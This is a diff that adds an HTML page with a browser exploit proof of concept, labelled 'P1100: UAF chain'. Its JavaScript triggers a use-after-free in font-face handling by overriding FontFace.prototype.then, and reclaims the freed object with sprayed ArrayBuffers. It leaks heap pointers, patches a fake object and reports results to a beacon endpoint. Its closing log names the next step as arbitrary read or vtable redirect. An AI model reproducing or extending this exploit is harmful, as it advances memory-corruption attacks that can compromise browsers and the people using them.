@@ -1,0 +1,365 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p1100</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:13px/1.6 monospace;padding:16px;min-height:100vh}
+#log{white-space:pre-wrap;word-break:break-all}
+.hit{color:#ff6;font-weight:bold}
+.ptr{color:#f6f;font-weight:bold}
+.fail{color:#f66}
+.ok{color:#6f6}
+.info{color:#6cf}
+.crit{color:#f00;font-weight:bold;font-size:14px}
+.win{color:#0f0;font-weight:bold;font-size:15px}
+.phase{color:#fff;font-size:14px;font-weight:bold;margin:8px 0}
+#prog{height:4px;background:#222;margin:8px 0;border-radius:2px}
+#bar{height:100%;background:#6f6;border-radius:2px;width:0%;transition:width 0.3s}
+</style>
+</head><body>
+<h2 style="color:#fff;font-size:16px;margin-bottom:4px">P1100: UAF chain — engine interaction after stabilization</h2>
+<div id="prog"><div id="bar"></div></div>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log'),bar=document.getElementById('bar');
+function log(cls,msg){var d=document.createElement('div');d.className=cls;d.textContent=msg;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(tag,data){try{new Image().src='/beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||'')+'&_='+Math.random();}catch(e){}}
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8, TARGET_BUF=37;
+
+B('P1100-BOOT','');
+log('phase','Phase 1: Establish P1099 read-then-patch primitive');
+
+// ============================================================
+// Phase 1: P1099 read-then-patch (establish stable UAF)
+// ============================================================
+var styleEl=null,firedHere=false,map=null,targetEntry=null;
+var fontFaceRef=null; // Keep JS reference to the FontFace
+
+var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+fontFaceRef=A;
+document.fonts.add(A);
+void A.loaded;
+styleEl=document.createElement('style');
+styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(styleEl);
+
+// Also keep ref to the style-based FontFace via CSS
+var cssRuleRef=null;
+
+firedHere=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(firedHere)return undefined;
+    firedHere=true;
+    cssRuleRef=this; // 'this' is the FontFace being resolved
+    if(styleEl)styleEl.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    map=[];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      for(var k=0;k<K;k++){
+        var ab=new ArrayBuffer(sz);
+        var entry={size:sz,ab:ab,view:new Uint8Array(ab),idx:si*K+k};
+        map.push(entry);
+        if(entry.idx===TARGET_BUF) targetEntry=entry;
+      }
+    }
+    try{document.fonts.check('1em s0');}catch(e){}
+    return undefined;
+  },
+  set:function(){}
+});
+document.fonts.load('1em f0, s0','AB').then(function(){},function(){});
+
+// Aggressive polling for engine writes
+var patched=false, leakedPtrs=null, patchTime=0;
+for(var t=15;t<=150;t+=5){
+  (function(ms){
+    setTimeout(function(){
+      if(patched||!targetEntry)return;
+      if(typeof BigUint64Array==='undefined')return;
+      var b64=new BigUint64Array(targetEntry.ab);
+      var nz=0;
+      for(var qi=0;qi<b64.length;qi++)if(b64[qi]!==0n)nz++;
+      if(nz>0){
+        patched=true;
+        patchTime=ms;
+        leakedPtrs=[];
+        for(var qi=0;qi<b64.length;qi++){
+          if(b64[qi]!==0n)leakedPtrs.push({off:qi*8,val:b64[qi]});
+        }
+        b64[0]=0x100n;
+        log('crit','PATCHED at '+ms+'ms! Leaked '+leakedPtrs.length+' values');
+        var pstr=leakedPtrs.map(function(p){return'+0x'+p.off.toString(16)+'=0x'+p.val.toString(16);}).join(', ');
+        log('ptr',pstr);
+        B('P1100-PATCH','ms='+ms+'|'+pstr);
+        bar.style.width='25%';
+
+        // Start Phase 2 after stabilization
+        setTimeout(startPhase2,500);
+      }
+    },ms);
+  })(t);
+}
+
+// ============================================================
+// Phase 2: Probe engine interaction with fake CSSFontFace
+// ============================================================
+function startPhase2(){
+  if(!patched||!targetEntry)return;
+  log('','');
+  log('phase','Phase 2: Engine interaction tests');
+  bar.style.width='30%';
+
+  var b64=new BigUint64Array(targetEntry.ab);
+
+  // Test A: snapshot buffer, wait, check for engine modifications
+  log('info','Test A: Monitor for engine reads/writes over 2 seconds');
+  var snapshot=[];
+  for(var qi=0;qi<b64.length;qi++)snapshot.push(b64[qi]);
+
+  setTimeout(function(){
+    var changes=[];
+    for(var qi=0;qi<b64.length;qi++){
+      if(b64[qi]!==snapshot[qi]){
+        changes.push('+0x'+(qi*8).toString(16)+': 0x'+snapshot[qi].toString(16)+' -> 0x'+b64[qi].toString(16));
+      }
+    }
+    if(changes.length>0){
+      log('hit','Engine MODIFIED buffer! '+changes.join(', '));
+      B('P1100-MODIFIED',changes.join(','));
+    }else{
+      log('ok','Buffer unchanged after 2s — engine not actively touching it');
+      B('P1100-STABLE','unchanged=2s');
+    }
+    bar.style.width='40%';
+
+    // Test B: Try accessing FontFace JS properties
+    startTestB();
+  },2000);
+}
+
+function startTestB(){
+  log('','');
+  log('phase','Test B: FontFace JS property access on dangling refs');
+
+  var results=[];
+
+  // fontFaceRef = the JS FontFace('f0') we created
+  // cssRuleRef = the FontFace 'this' from the .then getter (the one being resolved)
+
+  // Take a buffer snapshot before each access
+  var b64=new BigUint64Array(targetEntry.ab);
+  var preSnap=[];
+  for(var qi=0;qi<b64.length;qi++)preSnap.push(b64[qi]);
+
+  // Try reading properties from fontFaceRef (JS FontFace f0)
+  var props=['family','style','weight','unicodeRange','variant','featureSettings','display','status'];
+
+  log('info','Reading fontFaceRef (JS FontFace f0) properties:');
+  for(var i=0;i<props.length;i++){
+    var prop=props[i];
+    try{
+      var val=fontFaceRef[prop];
+      results.push({ref:'f0',prop:prop,val:String(val).substring(0,100),err:null});
+      log('ok','  .'+prop+' = '+String(val).substring(0,60));
+    }catch(e){
+      results.push({ref:'f0',prop:prop,val:null,err:e.message});
+      log('fail','  .'+prop+' THREW: '+e.message);
+    }
+  }
+
+  // Check if accessing f0 properties modified our buffer
+  var f0Changes=[];
+  for(var qi=0;qi<b64.length;qi++){
+    if(b64[qi]!==preSnap[qi])f0Changes.push('+0x'+(qi*8).toString(16));
+  }
+  if(f0Changes.length>0){
+    log('hit','f0 access MODIFIED buffer at: '+f0Changes.join(', '));
+    B('P1100-F0-MOD',f0Changes.join(','));
+  }else{
+    log('info','f0 access did not modify buffer (f0 has its own CSSFontFace)');
+  }
+
+  // Now try cssRuleRef (the 'this' from .then — the one whose CSSFontFace was freed)
+  log('','');
+  log('info','Reading cssRuleRef (the freed font) properties:');
+  var preSnap2=[];
+  for(var qi=0;qi<b64.length;qi++)preSnap2.push(b64[qi]);
+
+  if(cssRuleRef){
+    for(var i=0;i<props.length;i++){
+      var prop=props[i];
+      try{
+        var val=cssRuleRef[prop];
+        results.push({ref:'css',prop:prop,val:String(val).substring(0,100),err:null});
+        log('ok','  .'+prop+' = '+String(val).substring(0,60));
+      }catch(e){
+        results.push({ref:'css',prop:prop,val:null,err:e.message});
+        log('fail','  .'+prop+' THREW: '+e.message);
+      }
+    }
+
+    var cssChanges=[];
+    for(var qi=0;qi<b64.length;qi++){
+      if(b64[qi]!==preSnap2[qi])cssChanges.push('+0x'+(qi*8).toString(16)+': 0x'+preSnap2[qi].toString(16)+' -> 0x'+b64[qi].toString(16));
+    }
+    if(cssChanges.length>0){
+      log('crit','cssRef access MODIFIED our fake object! '+cssChanges.join(', '));
+      B('P1100-CSS-MOD',cssChanges.join(','));
+    }else{
+      log('info','cssRef access did not modify buffer');
+    }
+  }else{
+    log('fail','cssRuleRef is null (then getter did not capture this)');
+  }
+
+  // Beacon all property results
+  var rstr=results.map(function(r){return r.ref+'.'+r.prop+'='+(r.err?'ERR:'+r.err:r.val);}).join('|');
+  B('P1100-PROPS',rstr.substring(0,800));
+  bar.style.width='60%';
+
+  setTimeout(startTestC,500);
+}
+
+function startTestC(){
+  log('','');
+  log('phase','Test C: Trigger GC and check buffer changes');
+
+  var b64=new BigUint64Array(targetEntry.ab);
+  var preGC=[];
+  for(var qi=0;qi<b64.length;qi++)preGC.push(b64[qi]);
+
+  // Force GC pressure
+  log('info','Allocating 50MB to trigger GC...');
+  var garbage=[];
+  for(var i=0;i<5000;i++){
+    garbage.push(new ArrayBuffer(10000));
+  }
+  garbage=null; // release for GC
+
+  // Also try document.fonts operations that might touch our fake object
+  try{document.fonts.check('1em s0');}catch(e){}
+  try{document.fonts.check('1em f0');}catch(e){}
+  try{
+    var p=document.fonts.load('1em f0','X');
+    p.then(function(){},function(){});
+  }catch(e){}
+
+  setTimeout(function(){
+    var gcChanges=[];
+    for(var qi=0;qi<b64.length;qi++){
+      if(b64[qi]!==preGC[qi]){
+        gcChanges.push('+0x'+(qi*8).toString(16)+': 0x'+preGC[qi].toString(16)+' -> 0x'+b64[qi].toString(16));
+      }
+    }
+    if(gcChanges.length>0){
+      log('crit','GC/fonts MODIFIED buffer! '+gcChanges.join(', '));
+      B('P1100-GC-MOD',gcChanges.join(','));
+    }else{
+      log('ok','Buffer unchanged after GC pressure + fonts operations');
+      B('P1100-GC-STABLE','');
+    }
+    bar.style.width='75%';
+
+    startTestD();
+  },1000);
+}
+
+function startTestD(){
+  log('','');
+  log('phase','Test D: Multiple UAF triggers — heap pointer diversity');
+
+  // Trigger a SECOND CSSFontFace UAF to get different heap pointers
+  var styleEl2=document.createElement('style');
+  styleEl2.textContent="@font-face{font-family:s1;src:local(Arial);unicode-range:U+0043;}";
+  document.head.appendChild(styleEl2);
+  var B2=new FontFace('f1','local(Helvetica)',{unicodeRange:'U+0043'});
+  document.fonts.add(B2);
+  void B2.loaded;
+
+  var map2=null,target2=null,patched2=false;
+  var fired2=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(fired2)return undefined;
+      fired2=true;
+      styleEl2.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      map2=[];
+      for(var si=0;si<SIZES.length;si++){
+        var sz=SIZES[si];
+        for(var k=0;k<K;k++){
+          var ab=new ArrayBuffer(sz);
+          var entry2={size:sz,ab:ab,view:new Uint8Array(ab),idx:si*K+k};
+          map2.push(entry2);
+          if(entry2.idx===TARGET_BUF) target2=entry2;
+        }
+      }
+      try{document.fonts.check('1em s1');}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+  document.fonts.load('1em f1, s1','CD').then(function(){},function(){});
+
+  // Poll for second trigger
+  for(var t=15;t<=150;t+=5){
+    (function(ms){
+      setTimeout(function(){
+        if(patched2||!target2)return;
+        if(typeof BigUint64Array==='undefined')return;
+        var b64_2=new BigUint64Array(target2.ab);
+        var nz=0;
+        for(var qi=0;qi<b64_2.length;qi++)if(b64_2[qi]!==0n)nz++;
+        if(nz>0){
+          patched2=true;
+          b64_2[0]=0x100n;
+          var ptrs2=[];
+          for(var qi=0;qi<b64_2.length;qi++){
+            if(b64_2[qi]!==0n)ptrs2.push({off:qi*8,val:b64_2[qi]});
+          }
+          var p2str=ptrs2.map(function(p){return'+0x'+p.off.toString(16)+'=0x'+p.val.toString(16);}).join(', ');
+          log('crit','SECOND UAF patched at '+ms+'ms!');
+          log('ptr','Trigger 2: '+p2str);
+
+          // Compare with first trigger
+          log('','');
+          log('hit','=== Heap pointer comparison ===');
+          var ptr1_58=leakedPtrs.find(function(p){return p.off===0x58;});
+          var ptr1_68=leakedPtrs.find(function(p){return p.off===0x68;});
+          var ptr2_58=ptrs2.find(function(p){return p.off===0x58;});
+          var ptr2_68=ptrs2.find(function(p){return p.off===0x68;});
+          if(ptr1_58&&ptr2_58){
+            var delta58=ptr2_58.val-ptr1_58.val;
+            log('ptr','  +0x58: T1=0x'+ptr1_58.val.toString(16)+' T2=0x'+ptr2_58.val.toString(16)+' delta='+delta58.toString());
+          }
+          if(ptr1_68&&ptr2_68){
+            var delta68=ptr2_68.val-ptr1_68.val;
+            log('ptr','  +0x68: T1=0x'+ptr1_68.val.toString(16)+' T2=0x'+ptr2_68.val.toString(16)+' delta='+delta68.toString());
+          }
+          B('P1100-DUAL','t2='+p2str.substring(0,300));
+        }
+      },ms);
+    })(t);
+  }
+
+  // Final summary at 3s after test D start
+  setTimeout(function(){
+    bar.style.width='100%';
+    log('','');
+    log('phase','=== P1100 Summary ===');
+    log('win','Trigger 1: STABLE (patched at '+patchTime+'ms)');
+    if(patched2)log('win','Trigger 2: STABLE');
+    else log('fail','Trigger 2: did not fire or no reclaim');
+    log('info','Two controlled fake CSSFontFace objects in heap');
+    log('info','Next: chain into arbitrary read via FontFace property access or vtable redirect');
+    B('P1100-DONE','t1='+patchTime+'|t2='+patched2);
+  },3000);
+}
+</script>
+</body></html>
